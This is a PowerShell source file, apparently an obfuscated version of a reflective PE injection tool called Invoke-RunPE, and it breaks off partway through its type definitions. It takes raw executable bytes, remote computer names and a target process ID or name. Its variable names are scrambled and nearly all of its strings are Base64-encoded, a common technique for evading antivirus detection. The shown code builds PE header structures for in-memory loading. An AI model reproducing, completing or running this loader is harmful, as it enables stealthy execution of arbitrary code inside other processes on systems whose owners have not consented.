function Invoke-RunPE
{
[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $PEBytes,
	[Parameter(Position = 1)]
	[String[]]
	$ComputerName,
	[Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
	[String]
	$FuncReturnType = 'Void',
	[Parameter(Position = 3)]
	[String]
	$ExeArgs,
	[Parameter(Position = 4)]
	[Int32]
	$ProcId,
	[Parameter(Position = 5)]
	[String]
	$ProcName,
    [Switch]
    $ForceASLR,
	[Switch]
	$DoNotZeroMZ
)
Set-StrictMode -Version 2
${_/\/===\/=\__/==\} = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FuncReturnType,
		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		$ProcId,
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ProcName,
        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
	)
	Function _/=\_/=\_/\/\__/=\
	{
		$Win32Types = New-Object System.Object
		${_/=\/=\/==\/\/=\/} = [AppDomain]::CurrentDomain
		${__/==\/\/=\/\__/=} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBBAHMAcwBlAG0AYgBsAHkA'))))
		${_/=\/\/\_/\/\/===} = ${_/=\/=\/==\/\/=\/}.DefineDynamicAssembly(${__/==\/\/=\/\__/=}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		${_/==\/\_/\_/==\_/} = ${_/=\/\/\_/\/\/===}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBNAG8AZAB1AGwAZQA='))), $false)
		${_/\/\/=\_/\/=\/==} = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
		${_/===\/\/\_/==\__} = ${_/==\/\_/\_/==\_/}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQBUAHkAcABlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${_/===\/\/\_/==\__}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAHQAaQB2AGUA'))), [UInt16] 0) | Out-Null
		${_/===\/\/\_/==\__}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQAzADgANgA='))), [UInt16] 0x014c) | Out-Null
		${_/===\/\/\_/==\__}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQB0AGEAbgBpAHUAbQA='))), [UInt16] 0x0200) | Out-Null
		${_/===\/\/\_/==\__}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eAA2ADQA'))), [UInt16] 0x8664) | Out-Null
		${/==\/\/=\______/=} = ${_/===\/\/\_/==\__}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value ${/==\/\/=\______/=}
		${_/===\/\/\_/==\__} = ${_/==\/\_/\_/==\_/}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAFQAeQBwAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${_/===\/\/\_/==\__}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIAMwAyAF8ATQBBAEcASQBDAA=='))), [UInt16] 0x10b) | Out-Null
		${_/===\/\/\_/==\__}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIANgA0AF8ATQBBAEcASQBDAA=='))), [UInt16] 0x20b) | Out-Null
		${__/==\___/=\/\/=\} = ${_/===\/\/\_/==\__}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value ${__/==\___/=\/\/=\}
		${_/===\/\/\_/==\__} = ${_/==\/\_/\_/==\_/}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAUwB5AHMAdABlAG0AVAB5AHAAZQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${_/===\/\/\_/==\__}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBVAE4ASwBOAE8AVwBOAA=='))), [UInt16] 0) | Out-Null
		${_/===\/\/\_/==\__}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBOAEEAVABJAFYARQA='))), [UInt16] 1) | Out-Null
		${_/===\/\/\_/==\__}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8ARwBVAEkA'))), [UInt16] 2) | Out-Null
		${_/===\/\/\_/==\__}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8AQwBVAEkA'))), [UInt16] 3) | Out-Null
		${_/===\/\/\_/==\__}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBQAE8AUwBJAFgAXwBDAFUASQA='))), [UInt16] 7) | Out-Null
		${_/===\/\/\_/==\__}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8AQwBFAF8ARwBVAEkA'))), [UInt16] 9) | Out-Null
		${_/===\/\/\_/==\__}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAEEAUABQAEwASQBDAEEAVABJAE8ATgA='))), [UInt16] 10) | Out-Null
		${_/===\/\/\_/==\__}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAEIATwBPAFQAXwBTAEUAUgBWAEkAQwBFAF8ARABSAEkAVgBFAFIA'))), [UInt16] 11) | Out-Null
		${_/===\/\/\_/==\__}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAFIAVQBOAFQASQBNAEUAXwBEAFIASQBWAEUAUgA='))), [UInt16] 12) | Out-Null
		${_/===\/\/\_/==\__}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAFIATwBNAA=='))), [UInt16] 13) | Out-Null
		${_/===\/\/\_/==\__}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBYAEIATwBYAA=='))), [UInt16] 14) | Out-Null
		${__/\/\___/\_/==\/} = ${_/===\/\/\_/==\__}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value ${__/\/\___/\_/==\/}
		${_/===\/\/\_/==\__} = ${_/==\/\_/\_/==\_/}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMAVAB5AHAAZQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${_/===\/\/\_/==\__}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAwAA=='))), [UInt16] 0x0001) | Out-Null
		${_/===\/\/\_/==\__}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAxAA=='))), [UInt16] 0x0002) | Out-Null
		${_/===\/\/\_/==\__}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAyAA=='))), [UInt16] 0x0004) | Out-Null
		${_/===\/\/\_/==\__}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAzAA=='))), [UInt16] 0x0008) | Out-Null
		${_/===\/\/\_/==\__}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAEQAWQBOAEEATQBJAEMAXwBCAEEAUwBFAA=='))), [UInt16] 0x0040) | Out-Null
		${_/===\/\/\_/==\__}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAEYATwBSAEMARQBfAEkATgBUAEUARwBSAEkAVABZAA=='))), [UInt16] 0x0080) | Out-Null
		${_/===\/\/\_/==\__}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAE4AWABfAEMATwBNAFAAQQBUAA=='))), [UInt16] 0x0100) | Out-Null
		${_/===\/\/\_/==\__}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBJAFMATwBMAEEAVABJAE8ATgA='))), [UInt16] 0x0200) | Out-Null
		${_/===\/\/\_/==\__}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBTAEUASAA='))), [UInt16] 0x0400) | Out-Null
		${_/===\/\/\_/==\__}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBCAEkATgBEAA=='))), [UInt16] 0x0800) | Out-Null
		${_/===\/\/\_/==\__}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwA0AA=='))), [UInt16] 0x1000) | Out-Null
		${_/===\/\/\_/==\__}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBXAEQATQBfAEQAUgBJAFYARQBSAA=='))), [UInt16] 0x2000) | Out-Null
		${_/===\/\/\_/==\__}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBUAEUAUgBNAEkATgBBAEwAXwBTAEUAUgBWAEUAUgBfAEEAVwBBAFIARQA='))), [UInt16] 0x8000) | Out-Null
		${_____/\/=\/\/=\_/} = ${_/===\/\/\_/==\__}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value ${_____/\/=\/\/=\_/}
		${/====\/\/\_/===\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
		${_/===\/\/\_/==\__} = ${_/==\/\_/\_/==\_/}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABBAFQAQQBfAEQASQBSAEUAQwBUAE8AUgBZAA=='))), ${/====\/\/\_/===\/}, [System.ValueType], 8)
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
		${/=\/\/=\_/=\_/\/=} = ${_/===\/\/\_/==\__}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value ${/=\/\/=\_/=\_/\/=}
		${/====\/\/\_/===\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${_/===\/\/\_/==\__} = ${_/==\/\_/\_/==\_/}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARgBJAEwARQBfAEgARQBBAEQARQBSAA=='))), ${/====\/\/\_/===\/}, [System.ValueType], 20)
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFMAZQBjAHQAaQBvAG4AcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AG0AYgBvAGwAVABhAGIAbABlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFMAeQBtAGIAbwBsAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYATwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/====\_/=\/=\/\/=} = ${_/===\/\/\_/==\__}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value ${/====\_/=\/=\/\/=}
		${/====\/\/\_/===\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
		${_/===\/\/\_/==\__} = ${_/==\/\_/\_/==\_/}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATwBQAFQASQBPAE4AQQBMAF8ASABFAEEARABFAFIANgA0AA=='))), ${/====\/\/\_/===\/}, [System.ValueType], 240)
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAA=='))), ${__/==\___/=\/\/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(2) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(3) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBuAGkAdABpAGEAbABpAHoAZQBkAEQAYQB0AGEA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(8) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAVQBuAGkAbgBpAHQAaQBhAGwAaQB6AGUAZABEAGEAdABhAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(12) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARQBuAHQAcgB5AFAAbwBpAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(16) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(20) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAGEAZwBlAEIAYQBzAGUA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(24) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdABpAG8AbgBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(32) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(36) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(40) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(42) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(44) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(46) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(48) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(50) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAFYAZQByAHMAaQBvAG4AVgBhAGwAdQBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(52) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(56) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(60) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFMAdQBtAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(64) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAcwB5AHMAdABlAG0A'))), ${__/\/\___/\_/==\/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(68) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), ${_____/\/=\/\/=\_/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(70) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAFIAZQBzAGUAcgB2AGUA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(72) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAEMAbwBtAG0AaQB0AA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(80) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABSAGUAcwBlAHIAdgBlAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(88) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABDAG8AbQBtAGkAdAA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(96) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABlAHIARgBsAGEAZwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(104) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAdgBhAEEAbgBkAFMAaQB6AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(108) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbwByAHQAVABhAGIAbABlAA=='))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(112) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAVABhAGIAbABlAA=='))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(120) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwB1AHIAYwBlAFQAYQBiAGwAZQA='))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(128) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBwAHQAaQBvAG4AVABhAGIAbABlAA=='))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(136) | Out-Null
		(${_/===\/\/\_/==\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBlAHIAdABpAGYAaQBjAGEAdABlAFQAYQBiAGwAZQA='))), ${/=\/\/=\_/=\_/\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(144) | Out-Null
